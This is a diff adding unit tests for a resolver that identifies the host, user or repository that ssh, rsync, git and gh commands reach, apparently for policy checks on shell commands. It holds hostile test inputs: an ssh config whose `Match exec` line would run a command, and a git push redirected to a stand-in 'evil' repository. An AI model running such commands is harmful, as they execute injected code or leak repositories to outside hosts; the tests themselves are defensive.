@@ -4,6 +4,7 @@
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
 import { existsSync, mkdtempSync, writeFileSync } from "node:fs";
+import { execFileSync as run } from "node:child_process";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import test from "node:test";
@@ -192,4 +193,57 @@ test("calls the policy blocked never run a lookup", async () => {
   );
   assert.equal(accounts.size, 0);
   assert.deepEqual(ran, []);
+});
+
+test("what follows an ssh destination is the remote command, and option clusters are walked", async () => {
+  for (const command of [
+    `ssh -F ${sshConfig} prod-bastion ls -la /var/log`,
+    `ssh -F ${sshConfig} prod-bastion ps -p 123 -o user`,
+    `ssh -vF ${sshConfig} prod-bastion`,
+  ]) {
+    const account = await resolve(command);
+    assert.deepEqual([account?.host, account?.user], ["10.0.4.12:2222", "deploy"], command);
+  }
+});
+
+test("rsync reads its remote shell and skips option values", async () => {
+  const cases: [string, string][] = [
+    [`rsync -a -e "ssh -F ${sshConfig} -p 2200" src prod-bastion:/dest`, "10.0.4.12:2200"],
+    [`rsync -avze 'ssh -F ${sshConfig}' src prod-bastion:/dest --exclude foo:bar`, "10.0.4.12:2222"],
+    [`rsync -a --rsh="ssh -F ${sshConfig}" src prod-bastion:/dest`, "10.0.4.12:2222"],
+  ];
+  for (const [command, host] of cases) assert.equal((await resolve(command))?.host, host, command);
+  assert.equal(await resolve("rsync -a -e /usr/local/bin/custom-shell src prod-bastion:/dest"), undefined);
+});
+
+test("ssh configs are scanned through includes and only as regular files", async () => {
+  const dir = mkdtempSync(join(tmpdir(), "ssh-include-"));
+  const marker = join(dir, "ran");
+  writeFileSync(join(dir, "inner"), `Match host * exec "touch ${marker}"\n`);
+  writeFileSync(join(dir, "outer"), `Include ${join(dir, "inner")}\nHost prod-bastion\n  HostName 10.0.4.12\n`);
+  writeFileSync(join(dir, "safe"), `Include ${sshConfig}\n`);
+  run("mkfifo", [join(dir, "fifo")]);
+  assert.deepEqual(await resolve(`ssh -F ${join(dir, "outer")} prod-bastion`), { platform: "ssh", source: "unknown" });
+  assert.deepEqual(await resolve(`ssh -F ${join(dir, "fifo")} prod-bastion`), { platform: "ssh", source: "unknown" });
+  const safe = await resolve(`ssh -F ${join(dir, "safe")} prod-bastion`);
+  assert.deepEqual([safe?.host, safe?.user], ["10.0.4.12:2222", "deploy"]);
+  assert.equal(existsSync(marker), false);
+});
+
+test("a push that moves the repository or rewrites its config is unknown", async () => {
+  const dir = repo({ origin: "https://github.com/acme/app.git" });
+  for (const command of [
+    "git -c remote.origin.pushurl=https://github.com/evil/secret.git push",
+    "git --git-dir=/elsewhere/.git push",
+    "GIT_DIR=/elsewhere/.git git push origin main",
+  ]) {
+    assert.deepEqual(await resolve(command, dir), { platform: "git", source: "unknown" }, command);
+  }
+});
+
+test("gh commands that reach no repo report nothing", async () => {
+  const dir = repo({ origin: "https://github.com/acme/app.git" });
+  for (const command of ["gh help", "gh auth status", "gh version", "gh --version"]) {
+    assert.equal(await resolve(command, dir), undefined, command);
+  }
 });
